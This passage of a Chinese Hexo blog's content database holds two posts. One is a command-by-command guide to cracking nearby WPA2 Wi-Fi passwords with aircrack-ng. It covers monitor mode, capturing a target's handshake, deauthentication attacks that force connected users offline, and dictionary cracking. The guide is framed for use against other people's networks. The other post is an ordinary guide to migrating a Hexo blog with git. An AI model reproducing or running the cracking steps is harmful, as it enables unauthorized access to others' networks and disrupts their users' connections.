对无线AP设备发起ack攻击 让连接他的设备都下线 方便他重新链接抓包成功\n```\n\n### 破解密码\n```shell\naircrack-ng -w 密码字典 <包含握手包的 cap 文件> # 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND! 密码字典去网上下载多得很 \n```\n\n### 退出监听模式，连接无线网\n```shell\nairmon-ng stop <处于监听模式的无限网卡名称> # 无线网卡退出监听模式\n```\n\n### 使用命令连接网络\n```shell\nsudo systemctl start NetworkManager # 开启网络服务\n\nip addr 或者 ifconfig # 查看无线网卡名称(w开头得)\n\niwlist 无线网卡 scanning | grep -i essid # 扫描可用wifi\n\nnmcli device wifi connect wifi名字 password wifi密码 ifname 无线网卡 # 用这个无线网卡链接指定wifi\n```\n\n### 卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\n```shell\nsudo apt install xserver-xorg-input-all # 安装\n\nsudo apt autoremove xserver-xorg-input-all # 卸载\n```\n\n","slug":"wifi密码破解","published":1,"updated":"2023-03-10T02:52:09.359Z","_id":"clcy469mn0001covgh6zq60to","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"aircrack-ng工具安装\"><a href=\"#aircrack-ng工具安装\" class=\"headerlink\" title=\"aircrack-ng工具安装\"></a>aircrack-ng工具安装</h3><blockquote>\n<p>如果你是Kali用户，那么可以跳过这一步，Kali自带，我们以Ubuntu为例：</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> aircrack-ng <span class=\"token comment\"># 安装aircrack-ng 这个工具kali-linux默认安装了</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"查看无线网卡\"><a href=\"#查看无线网卡\" class=\"headerlink\" title=\"查看无线网卡\"></a>查看无线网卡</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airmon-ng <span class=\"token comment\"># 查看可用的无线网卡一般以`w`开头</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"开启监听模式\"><a href=\"#开启监听模式\" class=\"headerlink\" title=\"开启监听模式\"></a>开启监听模式</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airmon-ng start <span class=\"token operator\">&lt;</span>网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 指定无线网卡开启监听模式</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"扫描附近的无线网\"><a href=\"#扫描附近的无线网\" class=\"headerlink\" title=\"扫描附近的无线网\"></a>扫描附近的无线网</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airodump-ng <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 用这个监听网卡扫描附近的无线网络</span>\n\n<span class=\"token comment\"># airodump-ng wlp8s0mon</span>\n<span class=\"token comment\"># BSSID: 无线 AP 的硬件地址</span>\n<span class=\"token comment\"># PWR: 信号强度，值是负数，绝对值越小表示信号越强</span>\n<span class=\"token comment\"># CH: 无线网络信道</span>\n<span class=\"token comment\"># ENC: 加密方式，我们要破解的是 WPA2</span>\n<span class=\"token comment\"># ESSID: 无线网络的名称</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"监听你想破解的无线网\"><a href=\"#监听你想破解的无线网\" class=\"headerlink\" title=\"监听你想破解的无线网\"></a>监听你想破解的无线网</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airodump-ng <span class=\"token parameter variable\">-w</span> <span class=\"token operator\">&lt;</span>扫描结果保存的文件名<span class=\"token operator\">></span> <span class=\"token parameter variable\">-c</span> <span class=\"token operator\">&lt;</span>无线网络信道<span class=\"token operator\">></span> <span class=\"token parameter variable\">--bssid</span> <span class=\"token operator\">&lt;</span>目标无线 AP 的硬件地址<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用 只要有人链接这个wifi就会被抓包</span>\n\n<span class=\"token comment\"># BSSID: 无线 AP 的硬件地址</span>\n<span class=\"token comment\"># STATION: 用户设备的硬件地址</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"对无线AP或者用户设备发起ACK攻击\"><a href=\"#对无线AP或者用户设备发起ACK攻击\" class=\"headerlink\" title=\"对无线AP或者用户设备发起ACK攻击\"></a>对无线AP或者用户设备发起ACK攻击</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">aireplay-ng -<span class=\"token operator\">&lt;</span>攻击模式<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为下线<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>攻击次数<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为一直攻击<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token parameter variable\">-a</span> 无线 AP 硬件地址<span class=\"token operator\">></span> <span class=\"token parameter variable\">-c</span> <span class=\"token operator\">&lt;</span>用户设备硬件地址<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 使用 aireplay-ng 对目标设备发起ack攻击 让他强制下线 方便他重新链接抓包成功</span>\n\naireplay-ng -<span class=\"token operator\">&lt;</span>攻击模式<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为下线<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>攻击次数<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为一直攻击<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token parameter variable\">-a</span> 无线 AP 硬件地址<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 使用 aireplay-ng 对无线AP设备发起ack攻击 让连接他的设备都下线 方便他重新链接抓包成功</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"破解密码\"><a href=\"#破解密码\" class=\"headerlink\" title=\"破解密码\"></a>破解密码</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">aircrack-ng <span class=\"token parameter variable\">-w</span> 密码字典 <span class=\"token operator\">&lt;</span>包含握手包的 cap 文件<span class=\"token operator\">></span> <span class=\"token comment\"># 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND! 密码字典去网上下载多得很 </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"退出监听模式，连接无线网\"><a href=\"#退出监听模式，连接无线网\" class=\"headerlink\" title=\"退出监听模式，连接无线网\"></a>退出监听模式，连接无线网</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airmon-ng stop <span class=\"token operator\">&lt;</span>处于监听模式的无限网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 无线网卡退出监听模式</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"使用命令连接网络\"><a href=\"#使用命令连接网络\" class=\"headerlink\" title=\"使用命令连接网络\"></a>使用命令连接网络</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> systemctl start NetworkManager <span class=\"token comment\"># 开启网络服务</span>\n\n<span class=\"token function\">ip</span> addr 或者 <span class=\"token function\">ifconfig</span> <span class=\"token comment\"># 查看无线网卡名称(w开头得)</span>\n\niwlist 无线网卡 scanning <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-i</span> essid <span class=\"token comment\"># 扫描可用wifi</span>\n\nnmcli device wifi connect wifi名字 password wifi密码 ifname 无线网卡 <span class=\"token comment\"># 用这个无线网卡链接指定wifi</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\"><a href=\"#卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\" class=\"headerlink\" title=\"卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\"></a>卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> xserver-xorg-input-all <span class=\"token comment\"># 安装</span>\n\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> autoremove xserver-xorg-input-all <span class=\"token comment\"># 卸载</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"aircrack-ng工具安装\"><a href=\"#aircrack-ng工具安装\" class=\"headerlink\" title=\"aircrack-ng工具安装\"></a>aircrack-ng工具安装</h3><blockquote>\n<p>如果你是Kali用户，那么可以跳过这一步，Kali自带，我们以Ubuntu为例：</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> aircrack-ng <span class=\"token comment\"># 安装aircrack-ng 这个工具kali-linux默认安装了</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"查看无线网卡\"><a href=\"#查看无线网卡\" class=\"headerlink\" title=\"查看无线网卡\"></a>查看无线网卡</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airmon-ng <span class=\"token comment\"># 查看可用的无线网卡一般以`w`开头</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"开启监听模式\"><a href=\"#开启监听模式\" class=\"headerlink\" title=\"开启监听模式\"></a>开启监听模式</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airmon-ng start <span class=\"token operator\">&lt;</span>网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 指定无线网卡开启监听模式</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"扫描附近的无线网\"><a href=\"#扫描附近的无线网\" class=\"headerlink\" title=\"扫描附近的无线网\"></a>扫描附近的无线网</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airodump-ng <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 用这个监听网卡扫描附近的无线网络</span>\n\n<span class=\"token comment\"># airodump-ng wlp8s0mon</span>\n<span class=\"token comment\"># BSSID: 无线 AP 的硬件地址</span>\n<span class=\"token comment\"># PWR: 信号强度，值是负数，绝对值越小表示信号越强</span>\n<span class=\"token comment\"># CH: 无线网络信道</span>\n<span class=\"token comment\"># ENC: 加密方式，我们要破解的是 WPA2</span>\n<span class=\"token comment\"># ESSID: 无线网络的名称</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"监听你想破解的无线网\"><a href=\"#监听你想破解的无线网\" class=\"headerlink\" title=\"监听你想破解的无线网\"></a>监听你想破解的无线网</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airodump-ng <span class=\"token parameter variable\">-w</span> <span class=\"token operator\">&lt;</span>扫描结果保存的文件名<span class=\"token operator\">></span> <span class=\"token parameter variable\">-c</span> <span class=\"token operator\">&lt;</span>无线网络信道<span class=\"token operator\">></span> <span class=\"token parameter variable\">--bssid</span> <span class=\"token operator\">&lt;</span>目标无线 AP 的硬件地址<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用 只要有人链接这个wifi就会被抓包</span>\n\n<span class=\"token comment\"># BSSID: 无线 AP 的硬件地址</span>\n<span class=\"token comment\"># STATION: 用户设备的硬件地址</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"对无线AP或者用户设备发起ACK攻击\"><a href=\"#对无线AP或者用户设备发起ACK攻击\" class=\"headerlink\" title=\"对无线AP或者用户设备发起ACK攻击\"></a>对无线AP或者用户设备发起ACK攻击</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">aireplay-ng -<span class=\"token operator\">&lt;</span>攻击模式<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为下线<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>攻击次数<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为一直攻击<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token parameter variable\">-a</span> 无线 AP 硬件地址<span class=\"token operator\">></span> <span class=\"token parameter variable\">-c</span> <span class=\"token operator\">&lt;</span>用户设备硬件地址<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 使用 aireplay-ng 对目标设备发起ack攻击 让他强制下线 方便他重新链接抓包成功</span>\n\naireplay-ng -<span class=\"token operator\">&lt;</span>攻击模式<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为下线<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>攻击次数<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>为一直攻击<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token parameter variable\">-a</span> 无线 AP 硬件地址<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>处于监听模式的网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 使用 aireplay-ng 对无线AP设备发起ack攻击 让连接他的设备都下线 方便他重新链接抓包成功</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"破解密码\"><a href=\"#破解密码\" class=\"headerlink\" title=\"破解密码\"></a>破解密码</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">aircrack-ng <span class=\"token parameter variable\">-w</span> 密码字典 <span class=\"token operator\">&lt;</span>包含握手包的 cap 文件<span class=\"token operator\">></span> <span class=\"token comment\"># 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND! 密码字典去网上下载多得很 </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"退出监听模式，连接无线网\"><a href=\"#退出监听模式，连接无线网\" class=\"headerlink\" title=\"退出监听模式，连接无线网\"></a>退出监听模式，连接无线网</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">airmon-ng stop <span class=\"token operator\">&lt;</span>处于监听模式的无限网卡名称<span class=\"token operator\">></span> <span class=\"token comment\"># 无线网卡退出监听模式</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"使用命令连接网络\"><a href=\"#使用命令连接网络\" class=\"headerlink\" title=\"使用命令连接网络\"></a>使用命令连接网络</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> systemctl start NetworkManager <span class=\"token comment\"># 开启网络服务</span>\n\n<span class=\"token function\">ip</span> addr 或者 <span class=\"token function\">ifconfig</span> <span class=\"token comment\"># 查看无线网卡名称(w开头得)</span>\n\niwlist 无线网卡 scanning <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-i</span> essid <span class=\"token comment\"># 扫描可用wifi</span>\n\nnmcli device wifi connect wifi名字 password wifi密码 ifname 无线网卡 <span class=\"token comment\"># 用这个无线网卡链接指定wifi</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\"><a href=\"#卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\" class=\"headerlink\" title=\"卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\"></a>卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> xserver-xorg-input-all <span class=\"token comment\"># 安装</span>\n\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> autoremove xserver-xorg-input-all <span class=\"token comment\"># 卸载</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"hexo-dbackup","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-15T21:51:25.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"hexo数据备份，换机方案","_content":"\n<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1997527356&auto=1&height=66\"></iframe>\n</div>\n\n## 换机操作前\n\n> 在仓库中创建一个hexo[`写作仓库`]分支并设置为默认\n\n> 在本地配置好ssh连接，并测试是否连通github\n\n> git clone 这个仓库，因为设置成默认分支，所以直接clone的就是hexo\n\n> 将hexo分支下除了.git的文件全部删除，再将源文件中除了.deploy_git的所有文件拷贝到这里，如果安装了主题，需要将主题中的.git文件夹删除。原理就是hexo的源码和配置不会上传到github，只是上传的.deploy_git里面通过hexo g这个命令生成的静态文件，.deploy_git里面的文件会上传到哪里，这个你在项目目录_config.yaml中配置的，这里配置了上传到哪里，上传到哪个分支，因为这个.deploy_git是可以根据hexo g来生成，所以不用上传,即是说： `新拉下来的这个仓库是存放源代码的，如果是第一次做这个操作，需要将其他的文件全部删除，只留下一个.git文件夹，这是仓库信息，然后将源代码里面的除了.deploy_git的所有数据全部复制过来`\n\n> 添加一个.gitignore文件(可选)\n```yaml\n.DS_Store\nThumbs.db\ndb.json\n*.log\nnode_modules/\npublic/\n.deploy*/\n```\n\n```shell\ngit add .\n```\n\n```shel\ngit commit -m \"desc\"\n```\n\n```shell\ngit push origin\n```\n\n---\n\n## 换了电脑之后\n> 配置好git的ssh连接\n\n> 安装好Node\n\n```shell\nsudo apt/yum/dnf/yay/pacman install node\n```\n\n> 安装hexo依赖\n\n```shell\nsudo npm install hexo-cli -g\n```\n\n> 将写作仓库克隆\n\n```shell\ngit cloen `写作仓库`\n```\n\n> 进入克隆下来得写作仓库\n\n```shell\ncd xxx.github.io\n```\n\n> 安装node依赖\n\n```shell\nnpm install\n```\n\n> 安装生成文章推送依赖\n\n```shell\nsudo npm install hexo-deployer-git --save\n```\n\n> 构建文章\n\n```shell\nhexo g\n```\n\n> 发布文章\n\n```shell\nhexo d\n```\n\n就可以开始写博客了\n\n> 如果在已经编辑过的电脑上写博客，那么还需要git pull更新一下\n\n## 多端操作\n> 在新机子上clone仓库，clone的是源代码分支,然后安装依赖，开始写博客，如果新机子上以前有这个仓库，那么需要git pull更新一下再写\n\n> 在clone的这个仓库中，可以直接写博客，不用删除什么，也可以直接hexo -g -d来将静态页面推送到github，但是每次写完了，静态代码推送完了，然后删除.deploy_git文件夹，最后通过git将源码上传到仓库。\n\n\n## git配置ssh\n\n> ssh-keygen -t rsa -C \"邮箱\" 通过这个来生成rsa密钥\n\n> 生成的ras存放在用户目录下的.ssh文件夹中\n\n> cat id_rsa.pub 将公钥填写到github\n\n> ssh -T git@github.com 测试是否连上github","source":"_posts/hexo-dbackup.md","raw":"---\ntitle: hexo-dbackup\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-16 05:51:25\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: hexo数据备份，换机方案\ntags: hexo\ncategories: 博客部署\n---\n\n<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1997527356&auto=1&height=66\"></iframe>\n</div>\n\n## 换机操作前\n\n> 在仓库中创建一个hexo[`写作仓库`]分支并设置为默认\n\n> 在本地配置好ssh连接，并测试是否连通github\n\n> git clone 这个仓库，因为设置成默认分支，所以直接clone的就是hexo\n\n> 将hexo分支下除了.git的文件全部删除，再将源文件中除了.deploy_git的所有文件拷贝到这里，如果安装了主题，需要将主题中的.git文件夹删除。原理就是hexo的源码和配置不会上传到github，只是上传的.deploy_git里面通过hexo g这个命令生成的静态文件，.deploy_git里面的文件会上传到哪里，这个你在项目目录_config.yaml中配置的，这里配置了上传到哪里，上传到哪个分支，因为这个.deploy_git是可以根据hexo g来生成，所以不用上传,即是说： `新拉下来的这个仓库是存放源代码的，如果是第一次做这个操作，需要将其他的文件全部删除，只留下一个.git文件夹，这是仓库信息，然后将源代码里面的除了.deploy_git的所有数据全部复制过来`\n\n> 添加一个.gitignore文件(可选)\n```yaml\n.DS_Store\nThumbs.db\ndb.json\n*.log\nnode_modules/\npublic/\n.deploy*/\n```\n\n```shell\ngit add .\n```\n\n```shel\ngit commit -m \"desc\"\n```\n\n```shell\ngit push origin\n```\n\n---\n\n## 换了电脑之后\n> 配置好git的ssh连接\n\n> 安装好Node\n\n```shell\nsudo apt/yum/dnf/yay/pacman install node\n```\n\n> 安装hexo依赖\n\n```shell\nsudo npm install hexo-cli -g\n```\n\n> 将写作仓库克隆\n\n```shell\ngit cloen `写作仓库`\n```\n\n> 进入克隆下来得写作仓库\n\n```shell\ncd xxx.github.io\n```\n\n> 安装node依赖\n\n```shell\nnpm install\n```\n\n> 安装生成文章推送依赖\n\n```shell\nsudo npm install hexo-deployer-git --save\n```\n\n> 构建文章\n\n```shell\nhexo g\n```\n\n> 发布文章\n\n```shell\nhexo d\n```\n\n就可以开始写博客了\n\n> 如果在已经编辑过的电脑上写博客，那么还需要git pull更新一下\n\n## 多端操作\n> 在新机子上clone仓库，clone的是源代码分支,然后安装依赖，开始写博客，如果新机子上以前有这个仓库，那么需要git pull更新一下再写\n\n> 在clone的这个仓库中，可以直接写博客，不用删除什么，也可以直接hexo -g -d来将静态页面推送到github，但是每次写完了，静态代码推送完了，然后删除.deploy_git文件夹，最后通过git将源码上传到仓库。\n\n\n## git配置ssh\n\n> ssh-keygen -t rsa -C \"邮箱\" 通过这个来生成rsa密钥\n\n> 生成的ras存放在用户目录下的.ssh文件夹中\n\n> cat id_rsa.pub 将公钥填写到github\n\n> ssh -T git@github.com 测试是否连上github","slug":"hexo-dbackup","published":1,"updated":"2023-05-17T13:35:05.463Z","_id":"clcy469mu0003covggeohbi2n","comments":1,"layout":"post","photos":[],"link":"","content":"<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1997527356&auto=1&height=66\"></iframe>\n</div>\n\n<h2 id=\"换机操作前\"><a href=\"#换机操作前\" class=\"headerlink\" title=\"换机操作前\"></a>换机操作前</h2><blockquote>\n<p>在仓库中创建一个hexo[<code>写作仓库</code>]分支并设置为默认</p>\n</blockquote>\n<blockquote>\n<p>在本地配置好ssh连接，并测试是否连通github</p>\n</blockquote>\n<blockquote>\n<p>git clone 这个仓库，因为设置成默认分支，所以直接clone的就是hexo</p>\n</blockquote>\n<blockquote>\n<p>将hexo分支下除了.git的文件全部删除，再将源文件中除了.deploy_git的所有文件拷贝到这里，如果安装了主题，需要将主题中的.git文件夹删除。原理就是hexo的源码和配置不会上传到github，只是上传的.deploy_git里面通过hexo g这个命令生成的静态文件，.deploy_git里面的文件会上传到哪里，这个你在项目目录_config.yaml中配置的，这里配置了上传到哪里，上传到哪个分支，因为这个.deploy_git是可以根据hexo g来生成，所以不用上传,即是说： <code>新拉下来的这个仓库是存放源代码的，如果是第一次做这个操作，需要将其他的文件全部删除，只留下一个.git文件夹，这是仓库信息，然后将源代码里面的除了.deploy_git的所有数据全部复制过来</code></p>\n</blockquote>\n<blockquote>\n<p>添加一个.gitignore文件(可选)</p>\n</blockquote>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\">.DS_Store\nThumbs.db\ndb.json\n<span class=\"token important\">*.log</span>\nnode_modules/\npublic/\n.deploy<span class=\"token important\">*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-shel\" data-language=\"shel\"><code class=\"language-shel\">git commit -m &quot;desc&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> push origin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<hr>\n<h2 id=\"换了电脑之后\"><a href=\"#换了电脑之后\" class=\"headerlink\" title=\"换了电脑之后\"></a>换了电脑之后</h2><blockquote>\n<p>配置好git的ssh连接</p>\n</blockquote>\n<blockquote>\n<p>安装好Node</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> apt/yum/dnf/yay/pacman <span class=\"token function\">install</span> <span class=\"token function\">node</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装hexo依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-cli <span class=\"token parameter variable\">-g</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>将写作仓库克隆</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> cloen <span class=\"token variable\"><span class=\"token variable\">`</span>写作仓库<span class=\"token variable\">`</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>进入克隆下来得写作仓库</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> xxx.github.io<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装node依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装生成文章推送依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-deployer-git <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>构建文章</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo g<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>发布文章</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>就可以开始写博客了</p>\n<blockquote>\n<p>如果在已经编辑过的电脑上写博客，那么还需要git pull更新一下</p>\n</blockquote>\n<h2 id=\"多端操作\"><a href=\"#多端操作\" class=\"headerlink\" title=\"多端操作\"></a>多端操作</h2><blockquote>\n<p>在新机子上clone仓库，clone的是源代码分支,然后安装依赖，开始写博客，如果新机子上以前有这个仓库，那么需要git pull更新一下再写</p>\n</blockquote>\n<blockquote>\n<p>在clone的这个仓库中，可以直接写博客，不用删除什么，也可以直接hexo -g -d来将静态页面推送到github，但是每次写完了，静态代码推送完了，然后删除.deploy_git文件夹，最后通过git将源码上传到仓库。</p>\n</blockquote>\n<h2 id=\"git配置ssh\"><a href=\"#git配置ssh\" class=\"headerlink\" title=\"git配置ssh\"></a>git配置ssh</h2><blockquote>\n<p>ssh-keygen -t rsa -C “邮箱” 通过这个来生成rsa密钥</p>\n</blockquote>\n<blockquote>\n<p>生成的ras存放在用户目录下的.ssh文件夹中</p>\n</blockquote>\n<blockquote>\n<p>cat id_rsa.pub 